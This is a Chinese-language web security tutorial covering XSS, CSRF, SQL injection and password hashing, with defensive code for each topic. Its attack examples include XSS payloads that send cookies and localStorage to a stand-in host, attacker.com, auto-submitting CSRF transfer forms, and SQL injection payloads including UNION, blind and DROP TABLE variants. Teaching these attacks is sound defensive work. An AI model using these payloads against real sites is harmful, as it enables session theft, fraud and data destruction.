# Web安全专题完全指南

Web安全是全栈开发中不可或缺的重要组成部分。随着Web应用的普及和复杂化，安全威胁也在不断演变和升级。作为一名全栈开发者，必须深入理解各种安全威胁的原理、攻击方式以及防御策略，才能构建出真正安全可靠的应用程序。

本文档将系统性地介绍Web安全领域的核心知识点，从基础的攻击原理到高级的防御策略，从理论讲解到实战演练，帮助读者建立完整的安全知识体系。无论你是前端开发者、后端开发者还是全栈工程师，这份指南都将为你提供宝贵的安全知识储备。

---

## 一、XSS攻击：跨站脚本攻击详解

### 1.1 XSS攻击概述

XSS（Cross-Site Scripting）跨站脚本攻击是Web应用中最常见的安全漏洞之一。攻击者通过在网页中注入恶意脚本代码，当其他用户访问该页面时，恶意代码会在用户浏览器中执行，从而实现窃取用户会话、劫持页面、钓鱼攻击等恶意行为。

XSS攻击之所以危险，是因为它能够在受害者的浏览器中执行任意JavaScript代码。这意味着攻击者可以：

- 窃取用户的Cookie和会话信息
- 劫持用户的登录状态，以用户身份执行操作
- 修改页面内容，进行钓鱼欺诈
- 植入恶意广告或链接
- 记录用户的键盘输入（键盘记录器）
- 扫描用户内网信息

根据攻击方式的不同，XSS攻击可以分为三种类型：存储型、反射型和DOM型。

### 1.2 存储型XSS

存储型XSS是最危险的XSS攻击类型之一。其特点是攻击代码被永久存储在目标服务器的数据库或其他存储介质中，当用户访问包含该恶意内容的页面时，攻击代码会自动执行。

**攻击原理：**

存储型XSS的攻击流程通常包括以下几个步骤：

1. 攻击者发现存在存储型XSS漏洞的输入点（如评论区、用户资料、留言板等）
2. 攻击者构造包含恶意JavaScript代码的请求，将攻击代码提交到服务器
3. 服务器将恶意代码存储到数据库中
4. 当其他用户访问包含该恶意内容的页面时，服务器从数据库读取数据并嵌入到页面中返回
5. 用户浏览器解析页面时，恶意JavaScript代码被执行

**攻击示例：**

假设一个博客系统存在存储型XSS漏洞，攻击者在发表评论时输入以下内容：

```html
<script>
  // 窃取用户Cookie的恶意脚本
  document.location = 'https://attacker.com/steal?cookie=' + document.cookie;
</script>
```

当其他用户访问这篇博客文章，查看这条评论时，他们的浏览器会执行这段脚本，将自己的Cookie信息发送到攻击者的服务器。

**防御策略：**

防御存储型XSS的关键是在数据存储前和输出时进行严格的过滤和转义：

```javascript
// 服务端：对用户输入进行转义处理
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, (m) => map[m]);
}

// 使用DOMPurify进行更严格的过滤
const DOMPurify = require('dompurify');

function sanitizeUserInput(input) {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });
}
```

### 1.3 反射型XSS

反射型XSS是通过URL参数传递的XSS攻击方式。恶意脚本代码作为用户输入被服务器接收后，立即在响应中返回（反射）给用户，而不会存储在服务器端。

**攻击原理：**

反射型XSS的攻击流程如下：

1. 攻击者构造一个包含恶意脚本的URL链接，通常会对URL进行编码和伪装
2. 攻击者通过钓鱼邮件、社交媒体或其他方式诱导用户点击该链接
3. 用户点击链接后，向服务器发送请求
4. 服务器从URL参数中获取恶意脚本，并将其嵌入到响应页面中
5. 用户浏览器接收到响应后，执行了嵌入的恶意脚本

**攻击示例：**

假设一个搜索功能将用户输入的搜索关键词反射到页面中显示：

```html
<!-- 服务器端代码（存在漏洞） -->
<p>搜索结果：<?php echo $_GET['keyword']; ?></p>
```

攻击者构造如下URL：

```
https://vulnerable-site.com/search?keyword=<script>alert('XSS')</script>
```

当用户访问这个URL时，服务器直接将参数值反射到页面中，导致恶意脚本执行。

**防御策略：**

防御反射型XSS的主要方法是对URL参数进行严格的验证和输出编码：

```javascript
// Node.js/Express 示例：对查询参数进行验证和转义
const validator = require('validator');

app.get('/search', (req, res) => {
  const { keyword } = req.query;

  // 验证输入：只允许字母、数字和常见符号
  if (!validator.isAlphanumeric(keyword, 'en-US', { ignore: ' -_' })) {
    return res.status(400).send('无效的搜索关键词');
  }

  // HTML转义
  const safeKeyword = validator.escape(keyword);

  res.send(`<p>搜索结果：${safeKeyword}</p>`);
});
```

### 1.4 DOM型XSS

DOM型XSS是一种特殊类型的XSS攻击，它不涉及服务器端的处理，而是完全在客户端通过JavaScript操作DOM时产生。攻击payload在用户的浏览器中通过修改页面的DOM环境而执行。

**攻击原理：**

DOM型XSS的攻击流程如下：

1. 攻击者构造一个包含恶意脚本的URL
2. 用户访问该URL
3. 客户端JavaScript从URL中读取数据，并动态更新页面内容
4. 由于JavaScript的不安全操作，恶意脚本被插入到DOM中并执行

**攻击示例：**

```javascript
// 存在DOM型XSS漏洞的前端代码
const params = new URLSearchParams(window.location.search);
const name = params.get('name');

document.getElementById('welcome').innerHTML = `欢迎, ${name}!`;
```

攻击者构造如下URL：

```
https://vulnerable-site.com/?name=<img src=x onerror=alert('XSS')>
```

当用户访问此URL时，JavaScript从URL中获取name参数并直接插入到innerHTML中，导致img标签的onerror事件处理器执行。

**防御策略：**

DOM型XSS的防御主要依靠安全的DOM操作实践：

```javascript
// 防御DOM型XSS：避免使用innerHTML，使用更安全的API
const params = new URLSearchParams(window.location.search);
const name = params.get('name');

// 安全的做法：使用textContent而非innerHTML
document.getElementById('welcome').textContent = `欢迎, ${name}!`;

// 如果必须使用innerHTML，进行输入转义
function safeInnerHTML(element, text) {
  const div = document.createElement('div');
  div.textContent = text;
  element.innerHTML = div.innerHTML;
}
```

### 1.5 XSS实战：攻击与防御综合案例

下面通过一个完整的用户评论系统案例，展示XSS攻击与防御的完整过程。

**漏洞代码示例：**

```javascript
// 不安全的评论显示代码（漏洞版本）
app.get('/comment/:id', async (req, res) => {
  const comment = await db.getComment(req.params.id);

  // 直接将用户输入嵌入HTML，存在XSS漏洞
  const html = `
    <div class="comment">
      <h3>${comment.author}</h3>
      <p>${comment.content}</p>
    </div>
  `;

  res.send(html);
});
```

**攻击测试代码：**

```javascript
// 恶意评论内容
const maliciousComment = {
  author: '攻击者',
  content: `
    <img src=x onerror="
      fetch('https://attacker.com/api/steal', {
        method: 'POST',
        body: JSON.stringify({
          cookie: document.cookie,
          localStorage: localStorage
        })
      })
    ">
  `
};
```

**防御代码示例：**

```javascript
// 安全的评论显示代码（防御版本）
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

app.get('/comment/:id', async (req, res) => {
  const comment = await db.getComment(req.params.id);

  // 对作者名进行HTML转义
  const safeAuthor = DOMPurify.sanitize(comment.author, {
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: []
  });

  // 对评论内容进行净化，允许有限的HTML标签
  const safeContent = DOMPurify.sanitize(comment.content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'br'],
    ALLOWED_ATTR: []
  });

  const html = `
    <div class="comment">
      <h3>${safeAuthor}</h3>
      <p>${safeContent}</p>
    </div>
  `;

  res.setHeader('Content-Security-Policy', "default-src 'self'");
  res.send(html);
});
```

---

## 二、CSRF攻击：跨站请求伪造

### 2.1 CSRF攻击概述

CSRF（Cross-Site Request Forgery）跨站请求伪造是一种利用用户已认证的身份，在用户不知情的情况下执行非授权操作的攻击方式。攻击者诱导用户访问恶意页面，该页面自动向目标站点发起请求，由于用户的浏览器会自动携带目标站点的Cookie，服务器会认为是用户合法操作而执行。

CSRF攻击成功的条件包括：

1. 用户已经登录目标网站并持有有效的会话Cookie
2. 用户在登录状态下访问了攻击者构造的恶意页面
3. 目标网站没有对重要操作进行CSRF令牌验证

CSRF攻击可以导致以下危害：

- 修改用户资料、密码
- 转账、支付等金融操作
- 发表、删除内容
- 恶意订阅、购买
- 账户设置变更

### 2.2 攻击原理详解

CSRF攻击的核心原理是利用浏览器的Cookie机制和Web应用的身份验证机制。

**攻击流程：**

```
1. 用户登录网站A，获取有效的Session Cookie
2. 攻击者构造恶意页面，页面中包含向网站A发送请求的代码
3. 用户在登录网站A的情况下，访问攻击者的恶意页面
4. 恶意页面中的代码自动向网站A发送请求（通常是隐藏的form或图片）
5. 浏览器自动携带网站A的Cookie发送请求
6. 网站A验证Cookie后发现是有效会话，执行请求对应的操作
7. 攻击目的达成
```

**攻击方式一：自动提交表单**

```html
<!-- 恶意页面代码 -->
<!DOCTYPE html>
<html>
<head><title>正在加载...</title></head>
<body>
<!-- 隐藏的表单，自动提交 -->
<form id="csrf-form" action="https://target-bank.com/transfer" method="POST">
  <input type="hidden" name="toAccount" value="attacker123" />
  <input type="hidden" name="amount" value="10000" />
</form>

<script>
  // 页面加载完成后自动提交表单
  document.getElementById('csrf-form').submit();
</script>
</body>
</html>
```

**攻击方式二：图片标签发起GET请求**

```html
<!-- 图片标签发送GET请求（通常用于攻击需要GET参数的接口） -->
<img src="https://target-site.com/delete?id=123" width="0" height="0" />
```

**攻击方式三：Fetch API发起POST请求**

```javascript
// 使用Fetch API发起POST请求
fetch('https://target-site.com/api/change-email', {
  method: 'POST',
  credentials: 'include', // 携带目标站点的Cookie
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    email: 'attacker@evil.com'
  })
});
```

### 2.3 Token防御机制

CSRF令牌是防御CSRF攻击最有效的方法之一。其核心原理是在表单或请求中添加一个服务器生成的随机令牌，服务器在处理请求前验证该令牌的有效性。

**Token验证流程：**

1. 用户首次访问页面时，服务器生成一个唯一的CSRF令牌
2. 服务器将该令牌添加到表单的隐藏字段中，同时存储到服务器会话中
3. 用户提交表单时，令牌随请求一起发送
4. 服务器验证请求中的令牌与会话中存储的令牌是否匹配
5. 如果令牌无效或缺失，拒绝执行操作

**服务端实现：**

```javascript
// Node.js/Express CSRF Token 实现
const csrf = require('csurf');
const express = require('express');
const session = require('express-session');

const app = express();

// 配置会话中间件（CSRF令牌存储在会话中）
app.use(session({
  secret: 'your-secret-key',
  resave: false,
  saveUninitialized: false
}));

// 启用CSRF保护
const csrfProtection = csrf({ cookie: true });

// 中间件：生成CSRF令牌并传递到视图
app.use((req, res, next) => {
  res.locals.csrfToken = req.csrfToken();
  next();
});

// 受保护的表单路由
app.post('/transfer', csrfProtection, (req, res) => {
  // 处理转账逻辑
  const { toAccount, amount } = req.body;

  // 验证通过，执行转账
  transferMoney(req.session.userId, toAccount, amount);

  res.send('转账成功');
});
```

**前端实现：**

```html
<!-- 表单中添加CSRF令牌 -->
<form action="/transfer" method="POST">
  <!-- 从服务器获取的CSRF令牌 -->
  <input type="hidden" name="_csrf" value="{{csrfToken}}" />

  <label>目标账户:</label>
  <input type="text" name="toAccount" required />

  <label>金额:</label>
  <input type="number" name="amount" required />

  <button type="submit">转账</button>
</form>
```

```javascript
// React中使用CSRF令牌
function TransferForm({ csrfToken }) {
  return (
    <form action="/transfer" method="POST">
      <input type="hidden" name="_csrf" value={csrfToken} />

      <label>目标账户:</label>
      <input type="text" name="toAccount" required />

      <label>金额:</label>
      <input type="number" name="amount" required />

      <button type="submit">转账</button>
    </form>
  );
}
```

### 2.4 SameSite Cookie属性

SameSite是Cookie的一个安全属性，可以有效防止CSRF攻击。它告诉浏览器何时应该在跨站请求中携带Cookie。

**SameSite的三种模式：**

```javascript
// SameSite=Strict：完全禁止跨站携带Cookie
// 最安全，但用户体验较差
Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly

// SameSite=Lax：允许导航请求携带Cookie，但禁止跨站子请求
// 平衡了安全性和可用性
Set-Cookie: sessionId=abc123; SameSite=Lax; Secure; HttpOnly

// SameSite=None：允许所有跨站请求携带Cookie
// 必须配合Secure（HTTPS）使用
Set-Cookie: sessionId=abc123; SameSite=None; Secure; HttpOnly
```

**SameSite Lax规则详解：**

| 请求类型 | Strict | Lax | None |
|---------|--------|-----|------|
| 链接跳转（`<a>`） | ✗ | ✓ | ✓ |
| 预加载（`<link rel="prefetch">`） | ✗ | ✓ | ✓ |
| 表单POST | ✗ | ✓ | ✓ |
| 图片/脚本/iframe | ✗ | ✗ | ✓ |

**最佳实践：**

```javascript
// 使用express框架设置安全的Cookie
const session = require('express-session');

app.use(session({
  secret: 'your-secret-key',
  resave: false,
  saveUninitialized: false,
  cookie: {
    // 必须使用Secure确保Cookie仅通过HTTPS传输
    secure: true,
    // HttpOnly防止JavaScript读取Cookie
    httpOnly: true,
    // SameSite=Lax提供CSRF保护
    sameSite: 'lax',
    // 设置合理的过期时间
    maxAge: 24 * 60 * 60 * 1000 // 24小时
  }
}));
```

### 2.5 CSRF实战：完整的CSRF防护方案

下面是一个完整的CSRF防护实现，包括服务端和前端两部分：

**服务端实现：**

```javascript
// csrfmiddleware.js - CSRF防护中间件
const crypto = require('crypto');

class CSRFProtection {
  constructor() {
    // 生成密钥
    this.secret = crypto.randomBytes(32).toString('hex');
  }

  // 生成CSRF令牌
  generateToken(sessionId) {
    const timestamp = Date.now();
    const random = crypto.randomBytes(32).toString('hex');
    const data = `${sessionId}:${timestamp}:${random}`;

    const signature = crypto
      .createHmac('sha256', this.secret)
      .update(data)
      .digest('hex');

    return `${timestamp}:${random}:${signature}`;
  }

  // 验证CSRF令牌
  validateToken(sessionId, token) {
    if (!token) return false;

    const parts = token.split(':');
    if (parts.length !== 3) return false;

    const [timestamp, random, signature] = parts;

    // 检查令牌是否过期（1小时）
    const age = Date.now() - parseInt(timestamp);
    if (age > 3600000) return false;

    // 验证签名
    const data = `${sessionId}:${timestamp}:${random}`;
    const expectedSignature = crypto
      .createHmac('sha256', this.secret)
      .update(data)
      .digest('hex');

    return crypto.timingSafeEqual(
      Buffer.from(signature),
      Buffer.from(expectedSignature)
    );
  }

  // Express中间件
  middleware() {
    return (req, res, next) => {
      // 生成令牌并存储在会话中
      if (!req.session.csrfToken) {
        req.session.csrfToken = this.generateToken(req.sessionID);
      }

      // 将令牌传递给视图
      res.locals.csrfToken = req.session.csrfToken;

      // 对于非安全方法（POST/PUT/DELETE），验证令牌
      if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
        const token = req.body._csrf || req.headers['x-csrf-token'];

        if (!this.validateToken(req.sessionID, token)) {
          return res.status(403).json({
            error: 'CSRF验证失败，请刷新页面重试'
          });
        }

        // 使用后重新生成令牌（防止重放攻击）
        req.session.csrfToken = this.generateToken(req.sessionID);
      }

      next();
    };
  }
}

module.exports = new CSRFProtection();
```

**前端实现：**

```javascript
// fetchWithCSRF.js - 带CSRF令牌的Fetch封装
async function fetchWithCSRF(url, options = {}) {
  const defaultOptions = {
    credentials: 'include', // 携带Cookie
    headers: {
      'Content-Type': 'application/json',
      // 从meta标签获取CSRF令牌
      'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]')?.content
    }
  };

  const mergedOptions = {
    ...defaultOptions,
    ...options,
    headers: {
      ...defaultOptions.headers,
      ...options.headers
    }
  };

  const response = await fetch(url, mergedOptions);

  // 从响应头更新CSRF令牌
  const newToken = response.headers.get('X-Updated-CSRF-Token');
  if (newToken) {
    const meta = document.querySelector('meta[name="csrf-token"]');
    if (meta) meta.content = newToken;
  }

  return response;
}

// React Hook封装
import { useCallback } from 'react';

function useSecureFetch() {
  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;

  const securePost = useCallback(async (url, data) => {
    return fetchWithCSRF(url, {
      method: 'POST',
      body: JSON.stringify(data)
    });
  }, []);

  return { securePost };
}

// 使用示例
function ChangeEmailForm() {
  const { securePost } = useSecureFetch();

  const handleSubmit = async (email) => {
    const response = await securePost('/api/change-email', { email });
    const result = await response.json();
    console.log(result);
  };

  return (
    <form onSubmit={(e) => {
      e.preventDefault();
      handleSubmit(e.target.email.value);
    }}>
      <input type="email" name="email" required />
      <button type="submit">修改邮箱</button>
    </form>
  );
}
```

---

## 三、SQL注入：数据库安全

### 3.1 SQL注入概述

SQL注入是一种将恶意SQL代码插入到应用程序的SQL语句中的攻击技术。攻击者通过精心构造的输入数据，绕过应用程序的验证和限制，直接与数据库交互，从而实现未授权的数据访问、数据篡改或数据库服务器控制。

SQL注入攻击的危害极其严重：

- **数据泄露**：攻击者可以获取数据库中的所有敏感信息，包括用户资料、密码、信用卡信息等
- **数据篡改**：修改或删除数据库中的数据
- **身份绕过**：绕过登录验证，直接以管理员身份登录系统
- **系统控制**：在某些情况下，攻击者可以执行操作系统命令，控制整个服务器
- **数据破坏**：删除数据库表或整个数据库，造成数据丢失

### 3.2 注入类型详解

**类型一：基于错误的注入（Error-based）**

通过构造特殊的输入，使数据库返回错误信息，从而获取数据库结构信息：

```sql
-- 原始查询
SELECT * FROM users WHERE username = '$username' AND password = '$password'

-- 注入 payload
username: admin' OR '1'='1
password: anything

-- 实际执行的SQL
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
```

**类型二：联合查询注入（Union-based）**

使用UNION语句将恶意查询与原查询结合，获取额外数据：

```sql
-- 注入 payload
username: admin' UNION SELECT null,username,password,null,null FROM admin_users--

-- 实际执行的SQL
SELECT * FROM users WHERE username = 'admin' UNION SELECT null,username,password,null,null FROM admin_users--'
```

**类型三：布尔盲注（Boolean-based Blind）**

当页面不返回具体错误信息时，通过构造布尔条件判断数据库信息：

```sql
-- 判断数据库名第一个字符是否是 'a'
username: admin' AND (SELECT SUBSTRING(database(),1,1))='a'--

-- 如果条件为真，页面正常显示
-- 如果条件为假，页面显示异常
```

**类型四：时间盲注（Time-based Blind）**

利用数据库的延迟函数，根据响应时间判断信息：

```sql
-- 如果数据库名第一个字符是 'a'，延迟5秒
username: admin' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--

-- 通过测量响应时间推断信息
```

**类型五：堆叠查询注入（Stacked Queries）**

在支持多语句执行的数据库中，注入多条SQL语句：

```sql
-- 注入 payload
username: admin'; DROP TABLE users;--

-- 实际执行的SQL
SELECT * FROM users WHERE username = 'admin'; DROP TABLE users;--
```

### 3.3 参数化查询

参数化查询（Parameterized Queries）是防止SQL注入的最有效方法。其核心原理是将SQL语句的结构和数据分离，数据库引擎先解析SQL语句的结构，然后再将参数值绑定到占位符上。

**Java/JDBC参数化查询：**

```java
// 不安全的写法（直接拼接SQL）
String query = "SELECT * FROM users WHERE username = '" + username + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);

// 安全的写法（使用PreparedStatement）
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

**Node.js/PG参数化查询：**

```javascript
// 不安全的写法
const query = `SELECT * FROM users WHERE username = '${username}'`;
client.query(query);

// 安全的写法 - 使用参数化查询
const query = {
  text: 'SELECT * FROM users WHERE username = $1 AND password = $2',
  values: [username, password]
};
const result = await client.query(query);
```

**Python/SQLAlchemy参数化查询：**

```python
# 不安全的写法
query = f"SELECT * FROM users WHERE username = '{username}'"
result = session.execute(query)

# 安全的写法 - 使用绑定参数
from sqlalchemy import text

query = text("SELECT * FROM users WHERE username = :username AND password = :password")
result = session.execute(query, {"username": username, "password": password})
```

**ORM框架的正确使用：**

```javascript
// TypeORM参数化查询
import { getRepository } from 'typeorm';
import { User } from './entities/User';

// 使用find方法自动进行参数化
const users = await getRepository(User).find({
  where: {
    username: username,
    password: password
  }
});

// 使用createQueryBuilder构建安全查询
const result = await getRepository(User)
  .createQueryBuilder('user')
  .where('user.username = :username', { username })
  .andWhere('user.password = :password', { password })
  .getOne();
```

### 3.4 ORM防护策略

虽然ORM框架本身提供了一定的SQL注入防护，但不当使用仍可能产生漏洞。

**常见ORM安全模式：**

```javascript
// Sequelize安全查询
const { Op } = require('sequelize');

// 安全：使用 Op.eq 自动转义
const user = await User.findOne({
  where: {
    username: {
      [Op.eq]: username  // 自动参数化
    }
  }
});

// 危险：使用 Sequelize.literal 直接写SQL
const user = await User.findOne({
  where: {
    // 切勿这样使用！直接拼接用户输入
    [Op.and]: Sequelize.literal(`username = '${username}'`)
  }
});
```

**SQLAlchemy安全配置：**

```python
from sqlalchemy import create_engine, Column, Integer, String
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

# 创建安全的引擎配置
engine = create_engine(
    'postgresql://user:pass@localhost/mydb',
    pool_pre_ping=True,  # 连接前测试连接有效性
    echo=False  # 生产环境关闭SQL日志
)

Base = declarative_base()

class User(Base):
    __tablename__ = 'users'

    id = Column(Integer, primary_key=True)
    username = Column(String(100), unique=True, nullable=False)
    # 注意：永远不要在这里存储明文密码
    password_hash = Column(String(255), nullable=False)

# 创建安全的查询
def safe_login(db_session, username, password):
    # 使用绑定参数
    user = db_session.query(User).filter(
        User.username == username
    ).first()

    if user and verify_password(password, user.password_hash):
        return user
    return None
```

### 3.5 SQL注入实战：完整防护方案

**漏洞检测代码：**

```javascript
// 检测潜在SQL注入点
function detectSQLInjectionPatterns(input) {
  const dangerousPatterns = [
    /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|EXECUTE)\b)/i,
    /(--|;|\/\*|\*\/|@@|@)/,
    /(\bOR\b|\bAND\b).*(=|<|>|LIKE)/i,
    /('|"|;|=)/,
    /\bUNION\b/i,
    /\bINTO\b/i,
    /\bLOAD_FILE\b/i,
    /\bOUTFILE\b/i
  ];

  return dangerousPatterns.some(pattern => pattern.test(input));
}

// 扫描用户输入
function scanUserInput(req) {
  const suspiciousInputs = [];

  // 检查所有可能的输入点
  const inputSources = [
    ...Object.keys(req.query || {}),
    ...Object.keys(req.body || {}),
    ...Object.keys(req.params || {})
  ];

  for (const source of inputSources) {
    const value = req.query[source] || req.body[source] || req.params[source];
    if (typeof value === 'string' && detectSQLInjectionPatterns(value)) {
      suspiciousInputs.push({
        location: source,
        value: value,
        timestamp: new Date().toISOString()
      });
    }
  }

  return suspiciousInputs;
}
```

**安全查询封装：**

```javascript
// safeQuery.js - 安全的数据库查询封装
const { Pool } = require('pg');

class SafeQueryBuilder {
  constructor(pool) {
    this.pool = pool;
  }

  // 参数化查询
  async parameterizedQuery(text, params) {
    // 参数验证
    if (params && !Array.isArray(params)) {
      throw new Error('参数必须为数组');
    }

    try {
      const start = Date.now();
      const result = await this.pool.query(text, params);
      const duration = Date.now() - start;

      // 记录慢查询
      if (duration > 1000) {
        console.warn(`慢查询警告: ${duration}ms - ${text}`);
      }

      return result;
    } catch (error) {
      // 不向客户端暴露数据库错误详情
      console.error('数据库查询错误:', error.message);
      throw new Error('查询执行失败');
    }
  }

  // 用户查询示例
  async findUserByUsername(username) {
    // 白名单验证
    if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) {
      throw new Error('用户名格式不正确');
    }

    return this.parameterizedQuery(
      'SELECT id, username, email, created_at FROM users WHERE username = $1',
      [username]
    );
  }

  // 安全更新
  async updateUserPassword(userId, newPasswordHash) {
    return this.parameterizedQuery(
      'UPDATE users SET password_hash = $1, updated_at = NOW() WHERE id = $2',
      [newPasswordHash, userId]
    );
  }
}

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  max: 20,
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 2000
});

module.exports = new SafeQueryBuilder(pool);
```

---

## 四、密码安全：加密存储与验证

### 4.1 密码安全概述

密码是用户认证的基础，密码存储的安全性直接关系到用户账户的安全。一旦密码泄露，攻击者就可以冒充用户访问系统，执行各种操作。

密码安全面临的主要威胁包括：

- **彩虹表攻击**：攻击者预计算常见密码的哈希值，用于快速匹配
- **暴力破解**：尝试所有可能的密码组合
- **字典攻击**：使用常见密码列表进行匹配
- **社会工程学**：通过用户的个人信息推测密码
- **数据泄露**：通过其他渠道获取的密码库进行撞库

安全的密码存储需要满足以下原则：

1. **永不存储明文密码**：无论何时都不能以明文形式存储密码
2. **使用强哈希算法**：选择专门设计用于密码哈希的算法
3. **加盐处理**：为每个密码添加随机盐值，防止彩虹表攻击
4. **使用足够的工作因子**：增加计算成本，防止暴力破解
5. **实施密码策略**：强制用户使用强密码

### 4.2 哈希加盐技术

盐（Salt）是一个随机生成的字符串，在哈希密码之前与密码组合。其作用是确保即使两个用户使用相同的密码，它们的哈希值也不同。

**盐的作用原理：**

```
未加盐的哈希：
hash("password123") = abc123...

加盐的哈希：
hash("salt_xyz" + "password123") = def456...
hash("salt_abc" + "password123") = ghi789...
```

**安全的盐生成与存储：**

```javascript
// 使用Node.js内置的crypto模块
const crypto = require('crypto');

// 生成安全的随机盐
function generateSalt(length = 32) {
  return crypto.randomBytes(length).toString('hex');
}

// 不推荐的简单哈希（可被彩虹表攻击）
function simpleHash(password) {
  return crypto.createHash('sha256').update(password).digest('hex');
}

// 推荐的哈希函数（使用盐 + 多次哈希）
function saltedHash(password, salt) {
  // 使用PBKDF2算法
  const hash = crypto.pbkdf2Sync(
    password,
    salt,
    100000,  // 迭代次数
    64,      // 输出长度
    'sha512'
  );
  return hash.toString('hex');
}

// 完整的密码存储流程
function hashPassword(password) {
  const salt = generateSalt();  // 生成随机盐
  const hash = saltedHash(password, salt);

  // 存储格式：salt:hash
  return `${salt}:${hash}`;
}

// 验证密码
function verifyPassword(password, storedValue) {
  const [salt, hash] = storedValue.split(':');
  const newHash = saltedHash(password, salt);
  return crypto.timingSafeEqual(
    Buffer.from(hash, 'hex'),
    Buffer.from(newHash, 'hex')
  );
}
```

### 4.3 bcrypt算法详解

bcrypt是目前最广泛使用的密码哈希算法，专门为密码存储设计。它具有以下特点：

- **自适应哈希**：工作因子可调整，适应硬件发展
- **内置盐生成**：自动生成随机盐
- **防彩虹表**：设计时就考虑了彩虹表攻击
- **缓慢哈希**：计算成本高，有效防止暴力破解

**bcrypt使用示例：**

```javascript
// 使用bcrypt
const bcrypt = require('bcrypt');

const SALT_ROUNDS = 12;  // 工作因子，越大越安全但越慢

// 哈希密码
async function hashPassword(password) {
  // bcrypt自动生成盐并包含在哈希值中
  const hash = await bcrypt.hash(password, SALT_ROUNDS);
  return hash;
}

// 验证密码
async function verifyPassword(password, hash) {
  // bcrypt自动提取盐并进行验证
  return await bcrypt.compare(password, hash);
}

// 示例使用
async function userRegistration(username, password) {
  // 检查密码强度
  if (!isPasswordStrong(password)) {
    throw new Error('密码强度不足');
  }

  // 哈希密码
  const passwordHash = await hashPassword(password);

  // 存储用户信息
  await db.createUser({
    username,
    password_hash: passwordHash
  });

  return { success: true };
}

async function userLogin(username, password) {
  // 获取用户信息
  const user = await db.findUserByUsername(username);

  if (!user) {
    // 防止用户枚举攻击：执行一次虚假的哈希计算
    await bcrypt.hash(password, SALT_ROUNDS);
    return { success: false };
  }

  // 验证密码
  const isValid = await verifyPassword(password, user.password_hash);

  if (isValid) {
    // 登录成功，创建会话
    return { success: true, userId: user.id };
  }

  return { success: false };
}
```

**bcrypt的工作原理：**

```
bcrypt哈希格式：$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/X4.G5yJ5y5J5jJvXe

解读：
$2b$ - 算法版本
$12$ - 工作因子（2^12 = 4096次迭代）
$LQv3c1yq... - 22字符的盐
$X4.G5yJ5... - 31字符的哈希值
```

### 4.4 密码强度策略

密码强度是防止暴力破解的第一道防线。一个强密码应该：

- 长度至少8-12个字符
- 包含大小写字母混合
- 包含数字
- 包含特殊字符
- 不包含常见单词或模式

**密码强度验证：**

```javascript
// 密码强度验证
function validatePasswordStrength(password) {
  const errors = [];

  // 长度检查
  if (password.length < 8) {
    errors.push('密码长度至少为8个字符');
  }
  if (password.length > 128) {
    errors.push('密码长度不能超过128个字符');
  }

  // 复杂度检查
  if (!/[a-z]/.test(password)) {
    errors.push('密码必须包含小写字母');
  }
  if (!/[A-Z]/.test(password)) {
    errors.push('密码必须包含大写字母');
  }
  if (!/[0-9]/.test(password)) {
    errors.push('密码必须包含数字');
  }
  if (!/[!@#$%^&*(),.?":{}|<>]/.test(password)) {
    errors.push('密码必须包含特殊字符');
  }

  // 常见模式检查
  const commonPatterns = [
    /^[0-9]+$/,           // 纯数字
    /^[a-zA-Z]+$/,        // 纯字母
    /^(.)\1+$/,           // 重复字符
    /^(password|123456|qwerty|admin)/i  // 常见密码
  ];

  for (const pattern of commonPatterns) {
    if (pattern.test(password)) {
      errors.push('密码不能包含常见模式');
      break;
    }
  }

  return {
    isValid: errors.length === 0,
    errors
  };
}

// zxcvbn风格的强力检查
function checkPasswordStrength(password) {
  let score = 0;

  // 长度得分
  if (password.length >= 8) score++;
  if (password.length >= 12) score++;
  if (password.length >= 16) score++;

  // 复杂度得分
  if (/[a-z]/.test(password)) score++;
  if (/[A-Z]/.test(password)) score++;
  if (/[0-9]/.test(password)) score++;
  if (/[^a-zA-Z0-9]/.test(password)) score++;

  // 惩罚：常见模式
  if (/(.)\1{2,}/.test(password)) score--;  // 重复字符
  if (/^[a-z]+[0-9]+$/.test(password)) score--;  // 字母+数字模式
  if (/^[0-9]+[a-z]+$/.test(password)) score--;  // 数字+字母模式

  return {
    score: Math.max(0, score),
    level: score < 3 ? '弱' : score < 5 ? '中等' : '强'
  };
}
```

### 4.5 密码加密实战：完整实现

**密码服务完整实现：**

```javascript
// passwordService.js - 密码安全服务
const bcrypt = require('bcrypt');
const crypto = require('crypto');

class PasswordService {
  constructor() {
    // bcrypt工作因子，生产环境建议12-14
    this.saltRounds = process.env.NODE_ENV === 'production' ? 12 : 10;
  }

  // 生成密码哈希
  async hash(password) {
    // 先验证密码强度
    const validation = this.validateStrength(password);
    if (!validation.isValid) {
      throw new Error(`密码强度不足: ${validation.errors.join(', ')}`);
    }

    // 使用bcrypt哈希
    return await bcrypt.hash(password, this.saltRounds);
  }

  // 验证密码
  async verify(password, hash) {
    try {
      return await bcrypt.compare(password, hash);
    } catch (error) {
      // 防止时序攻击
      return false;
    }
  }

  // 密码强度验证
  validateStrength(password) {
    const errors = [];
